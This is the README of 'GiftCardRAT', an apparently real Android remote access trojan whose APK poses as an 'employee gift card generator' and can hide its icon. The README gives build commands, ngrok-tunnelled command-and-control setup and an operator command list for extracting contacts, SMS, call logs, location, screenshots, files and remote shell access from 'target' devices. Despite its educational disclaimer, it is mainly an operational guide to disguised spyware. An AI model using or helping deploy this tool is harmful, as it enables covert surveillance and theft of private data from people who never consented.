# GiftCardRAT

Android Remote Access Tool (RAT) with load-balancing capabilities for managing multiple devices simultaneously.

## ⚠️ Disclaimer

This tool is for **educational and authorized testing purposes only**. Unauthorized access to devices is illegal. Use responsibly and only on devices you own or have explicit permission to access.

## 🚀 Features

- **Multi-Device Support**: Handle multiple Android devices simultaneously through load balancing
- **Remote Shell Access**: Execute commands on connected Android devices
- **Data Extraction**: Access contacts, call logs, SMS, and location data
- **Screenshot Capture**: Take screenshots remotely
- **File Management**: Download files from connected devices
- **Ngrok Integration**: Expose local servers through ngrok tunneling
- **Configurable**: Centralized configuration through `server_config.json`

## 📊 How It Works

### System Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         INTERNET / WAN                               │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │    Ngrok Tunnel         │
                    │  (4.tcp.eu.ngrok.io)    │
                    │    Port: 14324          │
                    └────────────┬────────────┘
                                 │
                                 │ Forwards to localhost:9888
                                 │
                    ┌────────────▼────────────┐
                    │   Load Balancer         │
                    │   Port: 9888            │
                    │   (Round-Robin)         │
                    └────────────┬────────────┘
                                 │
                 ┌───────────────┼───────────────┬───────────┐
                 │               │               │           │
    ┌────────────▼────┐ ┌───────▼──────┐ ┌─────▼─────┐ ┌──▼──────┐
    │ Backend Server  │ │ Backend      │ │ Backend   │ │ Backend │
    │ Port: 9889      │ │ Port: 9890   │ │ Port: 9891│ │ Port:   │
    │                 │ │              │ │           │ │ 9892    │
    └────────────┬────┘ └───────┬──────┘ └─────┬─────┘ └──┬──────┘
                 │               │               │           │
                 └───────────────┴───────────────┴───────────┘
                                 │
                    ┌────────────▼────────────┐
                    │  Device Management      │
                    │  • Shell Commands       │
                    │  • Data Extraction      │
                    │  • File Downloads       │
                    │  • Screenshots          │
                    └─────────────────────────┘
                                 ▲
                 ┌───────────────┼───────────────┬───────────┐
                 │               │               │           │
    ┌────────────┴────┐ ┌───────┴──────┐ ┌─────┴─────┐ ┌──┴──────┐
    │   📱 Device 1   │ │ 📱 Device 2  │ │📱 Device 3│ │📱Device4│
    │  Android Phone  │ │ Android Tab  │ │ Android   │ │ Android │
    │  (GiftCard APK) │ │ (GiftCard    │ │ (GiftCard │ │(GiftCard│
    │                 │ │  APK)        │ │  APK)     │ │  APK)   │
    └─────────────────┘ └──────────────┘ └───────────┘ └─────────┘
```

### Workflow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        SETUP PHASE                                   │
└─────────────────────────────────────────────────────────────────────┘

    1. Configure                2. Build APK            3. Start Servers
       ┌───────┐                   ┌───────┐               ┌───────┐
       │ Edit  │                   │ python│               │start_ │
       │config │  ──────────▶      │build_ │  ────────▶    │multi. │
       │ .json │                   │apk.py │               │ ps1   │
       └───────┘                   └───────┘               └───────┘
                                       │                        │
                                       ▼                        ▼
                                  ┌────────┐            ┌──────────────┐
                                  │APK File│            │4 Backends +  │
                                  │Built   │            │Load Balancer │
                                  └────────┘            └──────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│                     OPERATION PHASE                                  │
└─────────────────────────────────────────────────────────────────────┘

    4. Deploy APK               5. Device Connects      6. Control Device
       ┌───────┐                   ┌───────┐               ┌───────┐
       │Install│                   │Auto-  │               │Issue  │
       │APK on │  ──────────▶      │Connect│  ────────▶    │Shell  │
       │Device │                   │to     │               │Cmds   │
       └───────┘                   │Server │               └───────┘
                                   └───────┘                    │
                                       │                        ▼
                                       ▼                   ┌─────────┐
                                  ┌────────┐              │Get Data:│
                                  │Device  │              │Contacts │
                                  │Visible │              │SMS, Loc │
                                  │in Shell│              │Files    │
                                  └────────┘              └─────────┘

┌─────────────────────────────────────────────────────────────────────┐
│                      DATA FLOW                                       │
└─────────────────────────────────────────────────────────────────────┘

  User Command                                           Device Response
  ────────────▶                                          ◀────────────

  getContacts ──▶ [Ngrok] ──▶ [LoadBalancer] ──▶ [Backend] ──▶ 📱
                                                                 │
  ◀────────────── [Results Stored in Dumps/] ◀──────────────────┘
```

### Connection Flow

```
┌──────────────┐
│ 1. APK Opens │  App launches on Android device
└──────┬───────┘
       │
       ▼
┌──────────────────────┐
│ 2. Connects to Ngrok │  Connects to configured ngrok URL
│    (4.tcp.eu.ngrok   │  e.g., 4.tcp.eu.ngrok.io:14324
│     .io:14324)       │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ 3. Ngrok Forwards to │  Tunnel forwards to localhost:9888
│    Load Balancer     │
│    (Port 9888)       │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ 4. Load Balancer     │  Distributes connection to available
│    Assigns Backend   │  backend (9889, 9890, 9891, or 9892)
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ 5. Backend Handles   │  Backend server manages device
│    Device Session    │  commands and responses
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ 6. Data Saved to     │  Extracted data stored in
│    Dumps/ Directory  │  Dumps/<device_info_timestamp>/
└──────────────────────┘
```

## 📋 Requirements

- **Python**: 3.6 - 3.8
- **Android Studio** (for APK building)
- **Java Development Kit (JDK)**
- **Ngrok** (for remote access)
- **PowerShell** (Windows) or Bash (Linux/Mac)

### Python Dependencies
Install required packages:
```bash
pip install -r requirements.txt
```

## 🛠️ Installation

1. Clone the repository:
```bash
git clone https://github.com/AmedeoV/GiftCardRAT.git
cd GiftCardRAT
```

2. Configure your settings in `server_config.json`:
```json
{
  "ngrok": {
    "ip": "your-ngrok-url.ngrok.io",
    "port": "12345"
  },
  "loadbalancer": {
    "listen_port": 9888,
    "backend_ports": [9889, 9890, 9891, 9892]
  },
  "apk": {
    "output_name": "employee-giftcard-generator.apk",
    "hide_icon": false
  }
}
```

3. Start ngrok:
```bash
ngrok tcp 9888
```

4. Update `server_config.json` with your ngrok URL and port

## 🔨 Building the APK

### Method 1: Using Configuration File
```bash
python build_apk.py
```

### Method 2: Manual Build with Arguments
```bash
python giftcard-rat.py --build -i <IP> -p <PORT> -o <output-name.apk>

# Example:
python giftcard-rat.py --build -i 4.tcp.eu.ngrok.io -p 14324 -o gift-app.apk

# Hide app icon:
python giftcard-rat.py --build -i 4.tcp.eu.ngrok.io -p 14324 --icon
```

The APK will be generated in the `Android/app/build/outputs/apk/debug/` directory.

## 🖥️ Running the Server

### Multi-Server System (Recommended)

Start the load balancer and multiple backend servers:

**Windows:**
```powershell
.\start_multi.ps1
```

**Stop all servers:**
```powershell
.\stop_multi.ps1
```

### Single Server Mode

```bash
python giftcard-rat.py --shell -i <IP> -p <PORT>

# Example:
python giftcard-rat.py --shell -i 0.0.0.0 -p 9889
```

## 📱 Using the App

1. Build and install the APK on target Android device
2. Launch the app on the device
3. The device will connect to your server automatically
4. Use the interactive shell to control the device

## 🎮 Available Commands

Once a device is connected, you can use these commands:

- `help` - Display available commands
- `deviceInfo` - Get device information
- `getContacts` - Extract all contacts
- `getCallLogs` - Extract call history
- `getSMS` - Extract SMS messages
- `getLocation` - Get current GPS location
- `screenshot` - Capture device screen
- `download <path>` - Download file from device
- `shell <command>` - Execute shell command on device
- `exit` - Disconnect and exit

## 📂 Project Structure

```
GiftCardRAT/
├── server_config.json          # Main configuration file
├── build_apk.py                # APK builder script
├── giftcard-rat.py             # Main RAT tool
├── fixed_server.py             # Backend server
├── ngrok_loadbalancer.py       # Load balancer
├── start_multi.ps1             # Start multi-server system
├── stop_multi.ps1              # Stop all servers
├── CONFIG_GUIDE.md             # Detailed configuration guide
├── Android/                    # Android app source
│   ├── app/
│   │   └── src/
│   └── build.gradle
├── Server/                     # Server utilities
│   ├── server.py
│   └── utils.py
└── Dumps/                      # Extracted data storage
```

## 🔧 Advanced Configuration

For detailed configuration options, see [CONFIG_GUIDE.md](CONFIG_GUIDE.md).

### Custom Load Balancer Ports
```bash
python ngrok_loadbalancer.py <listen_port> <backend_start_port>

# Example:
python ngrok_loadbalancer.py 9999 9000  # Backends: 9000-9003
```

### Override Config with Command Line
```bash
# Custom IP and port
python build_apk.py -i 192.168.1.100 -p 8085

# Hide app icon
python build_apk.py --hide-icon

# Custom output name
python build_apk.py -o my-custom-app.apk
```

## 🐛 Troubleshooting

### APK Build Issues
- Ensure Android SDK is properly installed
- Check that `ANDROID_HOME` environment variable is set
- Verify Java JDK is installed and in PATH

### Connection Issues
- Verify ngrok is running and URL is correct in config
- Check firewall settings
- Ensure device has internet connection
- Verify server is listening on correct port

### Server Won't Start
- Check if ports are already in use
- Verify Python version (3.6-3.8)
- Install missing dependencies

## 📄 License

This project is for educational purposes only. Use at your own risk.

## 👤 Author

**AmedeoV**

## 🙏 Acknowledgments

- Built for security research and educational purposes
- Inspired by various Android RAT projects
- Uses ngrok for tunneling capabilities

---

**Remember**: Always use this tool ethically and legally. Unauthorized access to devices is a crime.
